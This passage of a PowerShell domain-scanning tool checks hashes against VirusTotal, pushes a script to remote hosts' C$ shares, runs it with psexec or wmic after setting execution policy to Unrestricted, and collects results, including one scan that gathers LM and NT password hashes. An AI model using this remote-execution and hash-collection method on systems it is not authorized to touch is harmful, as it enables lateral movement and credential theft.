        DisableKeepAlive = $true
        Method = 'POST'
        Body = @{apikey = "$APIKey"}
    }

    $par['Body'].resource = $hashBlock

    try {
		$data = Invoke-RestMethod @par 
	} catch {
		Write-host -ForegroundColor Red "Virus total web request failed"
		Return $false
	}
	
    $data|%{
    $_.resource+","+$_.positives+","+$_.total+","+$_.scan_date+","+$_.permalink}|
    Add-Content "$TEMP_DIR\$OutFile" 
	Return $true
}

Function VTHashAnalysis
{
	if($PSVersionTable.PSVersion.Major -lt 3)
	{
		Write-Host -ForegroundColor Red "Function requires Powershell version 3.0 or higher"
		Return
	}
	
	Write-Host -ForegroundColor Green "
Virus Total Hash Analysis
-------------------------"
	while($true)
	{
		Write-Host "Enter proxy IP [none]: " -NoNewLine
		$proxyIP = ReadYellow 
		if($proxyIP)
		{
			if(ReturnFunction $proxyIP){Return}
			if(VerifyIP $proxyIP)
			{
				while($true)
				{
					Write-Host "Enter proxy port [8080]: " -NoNewLine
					$proxyPort = ReadYellow 
					if(-not $proxyPort){$proxyPort = 8080}
					elseif(ReturnFunction $proxyPort){Return}
					if(($proxyPort -lt 65536) -and ($proxyPort -gt 0)){break}
					else
					{
						Write-Host -Foregroundcolor Red "Invalid Port: $proxyPort"
					}
				}
				$global:PSDefaultParameterValues = @{
				'Invoke-RestMethod:Proxy'='http://$proxyIP:$proxyPort'
				'Invoke-WebRequest:Proxy'='http://$proxyIP:$proxyPort'
				'*:ProxyUseDefaultCredentials'=$true
				}
				break
			}
			else
			{
				Write-Host -Foregroundcolor Red "Invalid IP: $proxyIP"
			}
		}
		else {break}
	}
	while($true)
	{
		Write-Host "Enter path to hash file: " -NoNewLine
		$HashFile = ReadYellow
		if($HashFile -and (-not (Test-Path $HashFile)))
		{
			if(ReturnFunction $HashFile){Return}
			else
			{
				Write-Host -Foregroundcolor Red "File not found: $HashFile"
			}
		}
		elseif(-not $HashFile)
		{
			Write-Host -Foregroundcolor Red "Hash file cannot be null"
		}
		else{break}
	}
	while($true)
	{
		Write-Host "Enter API key: " -NoNewLine
		$APIKey = ReadYellow
		if(-not $APIKey)
		{
			Write-Host -Foregroundcolor Red "API key required!"
		}
		if(ReturnFunction $APIKey){Return}
		else{break}
	}
	Write-Host "Execute? [Y/n]: " -NoNewLine
	$Execute = ReadYellow
	if(($Execute -eq "n") -or ($Execute -eq "N")){Return}
	
	if(-not (Test-Connection www.virustotal.com -Quiet))
	{
		Write-Host -ForegroundColor Red "Cannot reach www.virustotal.com"
		Return
	}
	
	Write-Host
	Write-Host -ForegroundColor Yellow "Executing Virus-Total hash analysis"
	$script:outfile = "VT_HashAnalysis$((get-date).tostring("HHmmss")).csv"
	"File Hash,Hits,# of AVs,Analysis Date,URL" | Add-Content "$TEMP_DIR\$outfile"
	
	$progParam=@{
		Activity = "Virus-Total hash analysis"
		CurrentOperation = ""
		Status="Parsing hash file"
		PercentComplete=0
	}
	
	Write-Progress @progParam
	
	$regex = '\b[0-9a-fA-F]{32}\b'
	$hashes = select-string -Path $HashFile -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value.tostring() }
	$hashes = ($hashes|Sort-Object -Unique) 
	$hashBlock = ""
	for($c=0; $c -le $hashes.count; $c+= 25)
	{
		if (($hashes.count - $c) -lt 25)
		{
			$BlockSize = $hashes.count - $c
		}
		else {$BlockSize = 24}
		$First=$true
		$hashes[($c..($c+$BlockSize))] | % {
			if($First){$hashBlock=$_; $First=$false}
			else{$hashBlock = $hashBlock+", "+$_} 
		}
		$RequestStatus = SendRequest $hashBlock $APIKey
		if(-not $RequestStatus){Return}
		
		[int]$pct = ($c/$hashes.count)*100 
		$progParam.CurrentOperation ="$c/$($hashes.count) hashes processed"
		$progParam.Status="Progress"
		$progParam.PercentComplete = $pct
		Write-Progress @progParam 
		
		if($c -eq $hashes.count){Return}
		sleep 15
	}
	ConvertFileFormat "$TEMP_DIR\$outfile" 
}

#Run the Scan
Function Execute 
{
	if (-not $script:OUT_DIR){$ConfigSuccess = config} #scan vars have not been configured enter configuration mode
	else{$ConfigSuccess = $true}
	if(-not $ConfigSuccess){Return}
	
	if($script:CompsDate){
		#refresh list of active computers after 3 hours
		if($script:CompsDate -lt (Get-Date).AddHours(-3)){$script:FirstRunComps=$true}
	}
	
	if(-not ($ScanHostsFile -eq "ALL"))
	{
		$ModTime = (gci $ScanHostsFile).LastWriteTime
		if ($HostFileModTime -lt $ModTime)
		{
			$script:HostFileModTime = $ModTime
			$script:FirstRunComps=$true
		}
	}

	#Make data directory if it is not present
	if ((Test-Path $script:OUT_DIR) -eq $false)
	{
		mkdir -Path $script:OUT_DIR -Force | Out-Null
	}
	
	CreateTempDir
	DisplayMenu 
	
	#continue looping until all scans completed
	for($i=0; $i -lt $script:ScanChoiceArray.count; $i++)
	{
		if (-not (SetScanTypeVars $script:ScanChoiceArray[$i])){continue} #scan choice was invalid. Move to next
		
		if($script:Deploy)
		{		
			
			if(-not $script:AdminPrivs) #admin privs are required for psexec
			{
				Write-Host -ForegroundColor Red "Domain Admin privileges required to execute ScanType"
				#continue
			}
			
			if($script:FirstRunComps) #Test to see if list of active computers exists or not
			{
				if(-not (Test-Path $TEMP_DIR)){CreateTempDir}
				$script:ActiveComputers = GetActiveComputers 
			}
		
			CreateTempDir
		
			(get-Date).ToString()
			Write-Host -ForegroundColor Yellow "Performing $ScanType"
			
			$script:CleanUp = $true
			
			#Create error log.  This could be created dynamically when an error occurs by writing a Function and 
			#Storing it in the $scan hash-table to be accessible by script blocks but this was easier at the moment.
			"Time Stamp,Host Name, Error" | Add-Content "$TEMP_DIR\ErrorLog.csv" 
			
			ExecutePSexec
			CollectFiles

			if($scan.RemoteDataFile -eq "hashes392125281")
			{
				$scan.Data|out-file "$($scan.TEMP_DIR)\output.txt"
				$scan.Data = $null
			}
			ParseData $script:ScanChoiceArray[$i]
		}
	}
	if($script:CleanUp)
	{
		Write-Host -ForegroundColor Yellow "Cleaning Up..."
		RunScriptBlock $CleanUpSB $ActiveComputers $scan
		$script:CleanUp = $false
	}

	Write-Host
}

############################################
#		END	Scan Functions
############################################ 


############################################
# START Functions for Deploy/Multi-threading
############################################ 

Function RunScriptBlock #Create multiple threads to do work
{
    param($ScriptBlock, $RemoteHosts, $scan) #Function parameters

	#create run space pool.  Throttle is max number of threads to execute at once
    $RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, $scan.Throttle)
    $RunspacePool.Open()
    $Jobs = @()
	
	#iterate through hosts and start new powershell job for each host
    $RemoteHosts | % {
		
		#add the scriptblock and parameters
        $Job = [powershell]::Create().AddScript($ScriptBlock).AddArgument($_).AddArgument($scan)
        $Job.RunspacePool = $RunspacePool
       
        $Jobs += New-Object PSObject -Property @{
            RunNum = $_
            Pipe = $Job
            Result = $Job.BeginInvoke()
        }
    }
    
	#get results
    $Results = @()
    ForEach ($Job in $Jobs)
    {   
        $Results += $Job.Pipe.EndInvoke($Job.Result)
    }
	
    $Results 
    $RunspacePool.Dispose()
}

Function ExecutePSexec #Copy and execute deployable payload
{
	Write-Host -ForegroundColor Yellow "Executing payload on remote hosts"
	$PSexecJob = Start-Job -ScriptBlock $PSexecWatcher
	$Script:CollectComputers = RunScriptBlock $PSExec_SB $ActiveComputers $scan
	Stop-Job $PSexecJob
	Remove-Job $PSexecJob
}

Function CollectFiles #Collect results from remote hosts
{
	Write-Host -ForegroundColor Yellow "Collecting files from remote hosts"
	RunScriptBlock $CollectFiles_SB $CollectComputers $scan
}

Function ParseData #Build compile results into a single csv file
{
	param($ScanChoice)
	Write-Host -ForegroundColor Yellow "Parsing collected data"
	
	#set variables for different generated files
	$Results = "$TEMP_DIR\$OutFile"
	$ResultsUnique = "$TEMP_DIR\Unique.csv"
	$ResultsFiltered = "$TEMP_DIR\Filtered.csv"	
	$ResultsUniqFilt = "$TEMP_DIR\Filtered_Unique.csv"
	$Errors = "$TEMP_DIR\ErrorLog.csv"

	#Add column headers to files
    switch ($ScanChoice) 
    {
		1{"Host Name,Executable,Path" |Add-Content $Results}
		2{"Host Name,Description,Friendly Name,Location"|Add-Content $Results}
		3{"Host Name, Disabled"|Add-Content $Results}
        4{"Host Name,Command,Description,Location,User"|Add-Content $Results}
        5{"Host Name,Command,JobId,Name,Owner,Priority"|Add-Content $Results}
		6{"Host Name,Executable Path,Name" |Add-Content $Results}
        7{"Host Name,Description,DisplayName,Name,Started,State,Status" |Add-Content $Results}
        8{"Host Name,Name,StartMode,State,Status" |Add-Content $Results}
        9{"Host Name,Source IP,Source Port,Destination IP,Destination Port,State,Process Name,Process ID"|Add-Content $Results}
		10{"Host Name,InstallDate,InstallLocation,Name,Vendor,Version" |Add-Content $Results}
        11{"Host Name,Description,Name,Path" |Add-Content $Results} 
		13{"Host Name,Display Name,Enabled,UptoDate,Version"|Add-Content $Results}
		14{"Host Name,Account Name,Account Active,Last Logon"|Add-Content $Results}
		16{"Host Name,Description,HotFixID,InstalledBy,InstalledOn" |Add-Content $Results}
		101{"Host Name,File Name,Path" |Add-Content $Results}
		102{"Host Name,File Name,Path" |Add-Content $Results}
		103{"Host Name,File Name,Path" |Add-Content $Results}
		104{"Host Name,File Name,Path" |Add-Content $Results}
		105{"Host Name,File Name,Path" |Add-Content $Results}
		106{"Host Name,File Name,Path" |Add-Content $Results}
		107{"Host Name,File Name,Path" |Add-Content $Results}
		108{"Host Name,User"|Add-Content $Results}
		109{"IP Address,TTL"|Add-Content $Results}
		110{"Host Name,User,RID,LM Hash,NT Hash"|Add-Content $Results}
		111{"File Name,MD5 Hash"|Add-Content $Results}
	}
    
	#Append each data file to $results.  
    foreach ($file in (Get-ChildItem "$TEMP_DIR\" -Exclude "$OutFile", "ErrorLog.csv", "Scanned_Hosts*.csv" -Name))
    {
		#wait for file to unlock
		for($i=0; $i -lt 10; $i++)
		{
			try {
				#only add lines that contain data to $Results
				Get-Content "$TEMP_DIR\$file" -ErrorAction Stop| where {$_} | Add-Content "$Results" -ErrorAction Stop
				break
			} catch {
				start-sleep -Seconds 3
			}
		}
    }
	
	FilterData $ScanChoice
	
    return
}

#Create a count or unique data
Function UniqueFilter 
{
	$data|group|Select count,name|
		sort -property count -descending|%{
		"$($_.count),$($_.Name)" }
}

Function FilterData
{
	param($ScanChoice)
	
	$Content = Get-Content "$TEMP_DIR\$OutFile"
	switch($ScanChoice)
	{
		1{	
			$filter = Get-Content $KnownGood.UserExe | Where{$_}
			
			#Unique results
			"Count,Executable"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
			UniqueFilter | Add-Content $ResultsUnique
				
			#Filtered Results
			if($filter)
			{
				"Host Name,Executable,Path" |Add-Content $ResultsFiltered
				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
				
				#Unique filtered results
				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{$_.split(",")[1]}
				if($data)
				{
					"Count,Executable"|Add-Content $ResultsUniqFilt
					UniqueFilter | Add-Content $ResultsUniqFilt	
				}
			}
		}
		2{
			$filter = Get-Content $KnownGood.USB | Where{$_} 
			
			#Unique results
			"Count,Registry Key"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[3]}
			UniqueFilter | Add-Content $ResultsUnique
			
			#Filtered Results
			if($filter)
			{
				"Host Name,Description,Friendly Name,Location"|Add-Content $ResultsFiltered
				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
				
				#Unique filtered results
				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{$_.split(",")[3]}
				if($data)
				{
					"Count,Executable"|Add-Content $ResultsUniqFilt
					UniqueFilter | Add-Content $ResultsUniqFilt	
				}
			}	
		}			
        4{
			$filter = Get-Content $KnownGood.StartUpProg | Where{$_}
			
			#Unique results
			"Count,Command"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
			UniqueFilter | Add-Content $ResultsUnique
			
			#Filtered Results
			if($filter)
			{
				"Host Name,Command,Description,Location,User"|Add-Content $ResultsFiltered
				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
				
				#Unique filtered results
				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{$_.split(",")[1]}
				if($data)
				{
					"Count,Command"|Add-Content $ResultsUniqFilt
					UniqueFilter | Add-Content $ResultsUniqFilt	
				}
			}		
		}
			
        5{
			$filter = Get-Content $KnownGood.SchedTasks | Where{$_}
			
			#Unique results
			"Count,Command"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
			UniqueFilter | Add-Content $ResultsUnique
			
			#Filtered Results
			if($filter)
			{
				"Host Name,Command,JobId,Name,Owner,Priority"|Add-Content $ResultsFiltered
				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
				
				#Unique filtered results
				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{$_.split(",")[1]}
				if($data)
				{
					"Count,Command"|Add-Content $ResultsUniqFilt
					UniqueFilter | Add-Content $ResultsUniqFilt	
				}
			}	
		}	
		6{
			$filter = Get-Content $KnownGood.RunningProcs | Where{$_}
			
			#Unique results
			"Count,Executable,Path"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{"$($_.split(",")[2]),$($_.split(",")[1])"}
			UniqueFilter | Add-Content $ResultsUnique
			
			#Filtered Results
			if($filter)
			{
				"Host Name,Executable Path,Name"|Add-Content $ResultsFiltered
				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
				
				#Unique filtered results
				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{"$($_.split(",")[2]),$($_.split(",")[1])"}
				if($data)
				{
					"Count,Executable,Path"|Add-Content $ResultsUniqFilt
					UniqueFilter | Add-Content $ResultsUniqFilt	
				}
			}
		}		
        7{
			$filter = Get-Content $KnownGood.Drivers | Where{$_}
			
			#Unique results
			"Count,Driver Name"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[3]}
			UniqueFilter | Add-Content $ResultsUnique
			
			#Filtered Results
			if($filter)
			{
				"Host Name,Description,DisplayName,Name,Started,State,Status"|Add-Content $ResultsFiltered
				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
				
				#Unique filtered results
				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{$_.split(",")[3]}
				if($data)
				{
					"Count,Driver Name"|Add-Content $ResultsUniqFilt
					UniqueFilter | Add-Content $ResultsUniqFilt	
				}
			}
		}
        8{
			$filter = Get-Content $KnownGood.Services | Where{$_}
			
			#Unique results
			"Count,Service Name"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
			UniqueFilter | Add-Content $ResultsUnique
			
			#Filtered Results
			if($filter)
			{
				"Host Name,Name,StartMode,State,Status"|Add-Content $ResultsFiltered
				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
				
				#Unique filtered results
				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{$_.split(",")[1]}
				if($data)
				{
					"Count,Command"|Add-Content $ResultsUniqFilt
					UniqueFilter | Add-Content $ResultsUniqFilt	
				}
			}
		}
		10{
			$filter = Get-Content $KnownGood.Software | Where{$_}
			
			#Unique results
			"Count,Software Name"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[3]}
			UniqueFilter | Add-Content $ResultsUnique
			
			#Filtered Results
			if($filter)
			{
				"Host Name,InstallDate,InstallLocation,Name,Vendor,Version"|Add-Content $ResultsFiltered
				($Content|select -skip 1)|Select-String -NotMatch -SimpleMatch -Pattern $filter |Add-Content $ResultsFiltered
				
				#Unique filtered results
				$data = (Get-Content $ResultsFiltered|select -skip 1)|%{$_.split(",")[3]}
				if($data)
				{
					"Count,Software Name"|Add-Content $ResultsUniqFilt
					UniqueFilter | Add-Content $ResultsUniqFilt	
				}
			}
		}
		13{
			$filter = Get-Content $KnownGood.HotFix | Where{$_}
			
			"Count,HotFixID"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[2]}
			UniqueFilter | Add-Content $ResultsUnique
			
			#Filtered Results
			if($filter)
			{
				"Host Name,OS Version Number,Missing Hot-Fix"|Add-Content $ResultsFiltered
				
				#Get hosts names from hot fix scan
				$data = ($Content|select -skip 1)|%{$_.split(",")[0]}
				
				#for each host name find hot fixes that are NOT installed
				UniqueFilter | %{
					$HostName = $_.split(",")[1]
					$HostVersion = $script:ActiveComputers|%{$_|select-String $HostName}
					if($HostVersion) 
					{
						$HostVersion = $HostVersion.tostring().split(",")[2]
						$filter |where{$_}|%{
						
							#Version included in filter list should be major version (i.e. 6.1)
							if($_.split(",").count -gt 1){
								$FilterVer = $_.split(",")[0]
								$FilterHotFix = $_.split(",")[1]
								
								#Make sure host OS version matches filter
								if($HostVersion|Select-String $FilterVer) {
									#Check to see that host does NOT match the HotFixID
									if (-not ($Content | Select-String $HostName | Select-String $FilterHotFix))
									{
										"$HostName,$HostVersion,$($_.split(",")[1])"|Add-Content $ResultsFiltered
									}
								}
							}
							
							#Filter item is only a hotfixID
							else 
							{
								if (-not ($Content | Select-String $HostName | Select-String "$_"))
								{
									"$HostName,$HostVersion,$_"|Add-Content $ResultsFiltered
								}
							}
						}
					}
				}
			}
		}
		15{
			#Unique results
			"Count,Account Name"|Add-Content $ResultsUnique
			$data = ($Content|select -skip 1)|%{$_.split(",")[1]}
			UniqueFilter | Add-Content $ResultsUnique
		}
		104{
			$data = (Get-Content "$TEMP_DIR\$OutFile"|select -skip 1) |%{$_.split(",")[1]}
			if($data)
			{
				"Count,File Name"|Add-Content $ResultsUnique
				UniqueFilter | Add-Content $ResultsUnique	
			}
		}
		105{
			$data = (Get-Content "$TEMP_DIR\$OutFile"|select -skip 1) |%{$_.split(",")[1]}
			if($data)
			{
				"Count,File Name"|Add-Content $ResultsUnique
				UniqueFilter | Add-Content $ResultsUnique	
			}
		}
	}
	
	$ConvertFiles = $Errors, $ResultsUniqFilt, $ResultsFiltered, $ResultsUnique, $Results   
	ConvertFileFormat $ConvertFiles
}

Function Release-Ref
{
	param($ref)
	
	([System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$ref) -gt 0)
	[System.GC]::Collect()
	[System.GC]::WaitForPendingFinalizers()
}

Function ConvertFileFormat
{
	param($FileNames, $ScannedHosts)
	
	#If CSV just move files.  No conversion required
	if($OutputFormat -eq "csv")
	{
		if($ScannedHosts)
		{
			Move-Item "$TEMP_DIR\Scanned_Hosts*csv" "$OUT_DIR\"
		}
		else
		{
			Move-Item "$TEMP_DIR\$outfile" "$OUT_DIR\"
			Write-Host -ForegroundColor Green "Data located at $OUT_DIR\$outfile
		"
		}		
		
		Return
	}
	
	if(-not $ScannedHosts) #don't write converting file format when scanned hosts file is created
	{
		Write-Host -ForegroundColor Yellow "Converting file format"
	}
	
	if (-not (Test-Path "$OUT_DIR\CSV")) #verify/create directory for converted CSV files
	{
		mkdir "$OUT_DIR\CSV" |Out-Null
	}
	
	#Create a microsoft excel object and default to CSV on failure
	try {
		$excel = New-Object -ComObject Excel.Application -ErrorAction Stop
	} catch {
		Write-Host -ForegroundColor Red "Failed to create Excel object.  Defaulting to CSV"
		$script:OutputFormat = "CSV"
		
		if($ScannedHosts)
		{
			Move-Item "$TEMP_DIR\Scanned_Hosts*csv" "$OUT_DIR\"
		}
		else
		{
			Move-Item "$TEMP_DIR\$outfile" "$OUT_DIR\"
			Write-Host -ForegroundColor Green "Data located at $OUT_DIR\$outfile"
		}
		Return 
	}
	
	#set excel to invisible
	$excel.Visible = $false
	
	#Add workbook
	$workbook = $excel.workbooks.Add()
    
	#Remove other worksheets
    $workbook.worksheets.Item(2).delete()
   
    #After the first worksheet is removed,the next one takes its place
    $workbook.worksheets.Item(2).delete() 
	
	$i=1
	foreach ($CSV in $FileNames)
	{
		if(-not (Test-Path "$CSV")){continue}
		$File = (GCI $CSV).BaseName.split(".")[0]
		
		#If more than one file, create another worksheet for each file
        If ($i -gt 1) {
            $workbook.worksheets.Add() | Out-Null
        }
		
        #Use the first worksheet in the workbook (also the newest created worksheet is always 1)
        $worksheet = $workbook.worksheets.Item(1)
      
		#Add name of CSV as worksheet name
        $worksheet.name = $($File.split("012")[0])

        #Define the connection string and where the data is supposed to go
		$TxtConnector = ("TEXT;" + $CSV)
		$CellRef = $worksheet.Range("A1")
		
		#Build, use and remove the text file connector
		$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
		$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True
		$worksheet.QueryTables.item($Connector.name).TextFileParseType = 1
		$worksheet.QueryTables.item($Connector.name).Refresh()  | out-null
		$worksheet.QueryTables.item($Connector.name).delete()  | out-null

		#Autofit the columns
		$worksheet.UsedRange.EntireColumn.AutoFit() | out-null
		
		#Freeze first row
		$workSheet.Activate();
		$workSheet.Application.ActiveWindow.SplitRow = 1;
		$workSheet.Application.ActiveWindow.FreezePanes = $true

		#Apply autofilter
		$worksheet.usedrange.autofilter(1, [Type]::Missing) | Out-Null
		
        $i++
	}

	switch($OutputFormat)
	{
		#File Extension ".xlsb" --> XlFileFormat= 50 
		#File Extension".xlsx"  --> XlFileFormat= 51
		#File Extension".xlsm"  --> XlFileFormat= 52
		#File Extension".xls"   --> XlFileFormat= 56
		#File Extension".csv"   --> XlFileFormat= 6
		#File Extension".txt"   --> XlFileFormat= -4158
		#File Extension ".prn"  --> XlFileFormat= 36
		#Link below shows all file format options
		#https://msdn.microsoft.com/en-us/library/office/ff198017.aspx
		
		"xlsb"{
			$workbook.SaveAs("$OUT_DIR\${File}.xlsb",50)
			$out = "$OUT_DIR\${File}.xlsb"
		}
		"xlsx"{
			$workbook.SaveAs("$OUT_DIR\${File}.xlsx",51)
			$out = "$OUT_DIR\${File}.xlsx"
		}
		"xls"{
			$workbook.SaveAs("$OUT_DIR\${File}.xls",56)
			$out = "$OUT_DIR\${File}.xls"
		}
	}
	
	for($i=0; $i -lt 15; $i++) #move CSV data files to CSV folder
	{
		try {
			if ($ScannedHosts) {Move-Item "$TEMP_DIR\$Scanned_Hosts*.csv" "$OUT_DIR\CSV" -Force -ErrorAction Stop}
			else {Move-Item "$TEMP_DIR\$OutFile" "$OUT_DIR\CSV" -Force -ErrorAction Stop}
			break
		} catch {
			sleep 1
		}
	}
	
	$excel.Quit()
	
	#Release processes for Excel
	$a = Release-Ref($worksheet)
	$a = Release-Ref($workbook)
	
	#remove temp directory files. keep looping until all processes unlock files
	while($true){
		try{
			Remove-Item -Recurse -Force "$TEMP_DIR/*" -ErrorAction Stop
			break
		} catch {sleep 3}
	}
	
	if(-not $ScannedHosts)
	{
		Write-Host -ForegroundColor Green "Data located at $out
	"
	}
}


############################################
#	END Functions for Deploy/Multi-threading
############################################ 


############################################
#	START Multi-threading script blocks
############################################

[ScriptBlock] $GetComputersSB = {

	param($RHost, $scan)
	
	Function VerifyIP
	{
		param($IP)
		
		$Octets = $IP.split(".")
		if($Octets.count -ne 4){Return $false}
		
		for($i=0; $i -lt 4; $i++)
		{
			$num = [convert]::ToInt32($Octets[$i], 10)
			if(-not (($num -le 255) -and ($num -ge 0))){
				Return $false
			}
		}
		Return $true
	}
	
	$Hostname = $RHost.split(",")[0] #in case file is hostname, os,version number csv grab only the hostname
	
	if(VerifyIP $Hostname -ErrorAction SilentlyContinue) #If true Host name is an IP address
	{
		$HostIP = $Hostname
		$Hostname = ([System.Net.Dns]::GetHostEntry("$HostIP")).Hostname.split(".")[0]

		if( -not $Hostname) #Reverse DNS failed
		{
			Return "$HostIP" #Return IP
		}
	}

	$Search = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($scan.DomainName)")
	$Search.filter = "(&(name=$Hostname)(objectClass=computer))"
	$HostData = $Search.FindOne()
	if($HostData)
	{
		$HostData.GetDirectoryEntry()|%{
			$name=$_.name
			$os=$_.OperatingSystem
			$ver=$_.OperatingSystemVersion
			Return "$name,$os,$ver" | Select-String "Windows"	
		}
	}
	
	else #Host not found in Active Directory.  Return IP
	{
		$HostIP = ([System.Net.Dns]::GetHostEntry("$Hostname")).addresslist|%{$_.IPAddressToString}
		Return $HostIP
	}
}

#script block to find active machines
[ScriptBlock] $ActiveComputers_SB = {
    param($RHost, $scan)
    $RHost | % {
        $Comp = $_.split(",")[0]
		$OSCaption = $_.split(",")[1]
		$Ver = $_.split(",")[2]
		if(-not $Ver) #If version was not found then $Comp is an IP address
		{
			$HostIP = $Comp
			if(Test-Path  "\\$HostIP\c$\")
			{
				try {
					$OS = Get-WmiObject -ComputerName $HostIP Win32_OperatingSystem -ErrorAction Stop
				} Catch {Return}
				
				$IPaddr = $HostIP
				$Comp = $OS.CSName
				$OSCaption = $OS.caption.replace(',', '').replace('Microsoft ', '')
				$Ver = $OS.version
				Return $Comp+","+$IPaddr+","+$OSCaption+","+$Ver
			}
			else{Return} 
		}
		else{
			$IPaddr = ([System.Net.Dns]::GetHostEntry("$Comp")).addresslist|%{$_.IPAddressToString}
			if(-not $IPaddr){Return} #Host name cannot be resolved
		}
        if (Test-Path  "\\$Comp\c$\")
        {
			$Ver = $Ver.substring(0,3)
            Return $Comp+","+$IPaddr+","+$OSCaption+","+$Ver
        }
    }
}

#scriptblock to execute psexec on remote hosts
[ScriptBlock] $PSExec_SB = {
    param($RHost, $scan)

    $HostName=$RHost.split(",")[0]
	$HostIP=$RHost.split(",")[1]
    $ver=$RHost.split(",")[3]
	
    if($ver.split(".")[0] -ge 6) #powershell for vista+
	{
		$Rcode = "PSExecShellCode.ps1"
		$PSCode = $scan.PS1Code
		$PSexecArgs = 'echo . | powershell $ExPol = $(Get-ExecutionPolicy); Set-ExecutionPolicy Unrestricted; c:\PSExecShellCode.ps1; Set-ExecutionPolicy $ExPol'
		$ps=$true
	}
    else 
	{
		$Rcode = "PSExecShellCode.bat"
		$PSCode = $scan.BATCode
		$ps=$false
	}
	
    if (Test-Path "\\$HostIP\c$\$Rcode")
	{
        Remove-Item -Path "\\$HostIP\c$\$Rcode" -Force
	}
	
    try{
		$PSCode | Add-Content "\\$HostIP\c$\$Rcode" -ErrorAction Stop
    } catch {
        "$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Copy failed" | Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
        continue
    } 
	if ($scan.psexec)
	{
		if($ps)
		{	
			$Success = (&$scan.psexec -accepteula -s -d "\\$HostIP" cmd /c $PSexecArgs 2>&1|Select-String "started on $HostIP")
		}
		else
		{    
			$Success = (&$scan.psexec -accepteula -s -d "\\$HostIP" "c:\PSExecShellCode.bat" 2>&1|Select-String "started on $HostIP")
		}
		if($Success){
			Return $RHost
		}
	}
	if (-not $Success)
	{
		if($ps)
		{	
			$Success = (&wmic /node:"$HostIP" process call create "cmd /c $PSexecArgs" 2>&1|Select-String "ProcessId")
		}
		else
		{    
			$Success = (&wmic /node:"$HostIP" process call create "cmd /c c:\PSExecShellCode.bat" 2>&1|Select-String "ProcessId")
		}
	}
	if($Success){
		Return $RHost
	}
	else
	{
		"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Remote Execution failed" | Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"
		Remove-Item -Path "\\$HostIP\c$\PSExecShellCode.*" -Force -ErrorAction SilentlyContinue
	} 
}

#Job to kill hung psexec processes after 15 seconds
[ScriptBlock] $PSexecWatcher = {
    While($true){
        $PSexecProcs = get-process psexec -ErrorAction SilentlyContinue
        if($PSexecProcs){
            $PSexecProcs| %{
                if ($_.Starttime -ilt $(get-date).AddSeconds(-30))
                {
                    Stop-Process -Id $_.Id -Force
                }
            }
        }
        sleep 1
    }
}

#script block to collect data file from remote hosts
[ScriptBlock] $CollectFiles_SB = {
    param($RHost, $scan)
    $HostName = $RHost.split(",")[0]
	$HostIP = $RHost.split(",")[1]
    $ver=$RHost.split(",")[3]
    
	if($ver.split(".") -ge 6){$Rcode = "PSExecShellCode.ps1"}
    else {$Rcode = "PSExecShellCode.bat"}
    
	for($i=0; $i -lt $scan.TimeOut; $i++) #wait until scan finishes
    {
        if (Test-Path "\\$HostIP\c$\$Rcode"){sleep 1} 
        else {break}
    }
	
	#log scan time-out error
	if($i -eq $scan.TimeOut){"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Scan Timed-out"| Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"}
   
    if (Test-Path  "\\$HostIP\c$\$($scan.RemoteDataFile)")
    {   
        for($j=0; $j -lt $scan.TimeOut; $j++)
        {
            #wait for file to unlock
			try {
				$scan.mtx.waitone() |Out-Null
				if($scan.RemoteDataFile -eq "hashes392125281")
				{
					$scan.Data = ($scan.Data + (get-content "\\$HostIP\C$\$($scan.RemoteDataFile)") | sort -Unique) 
				}
				else
				{
					Add-content -Path "$($scan.TEMP_DIR)\output.txt" -Value (get-content "\\$HostIP\C$\$($scan.RemoteDataFile)") -ErrorAction Stop
				}
				$scan.mtx.ReleaseMutex()
				Remove-Item -Force "\\$HostIP\C$\$($scan.RemoteDataFile)"
				break
			} catch {
				$scan.mtx.ReleaseMutex()
				start-sleep -Seconds 1
			}
        }
    }
	else {"$((get-date).ToString('yyyy-MMM-dd hh:mm:ss')),$HostName,Absent Data-file"| Add-Content "$($scan.TEMP_DIR)\ErrorLog.csv"}
	
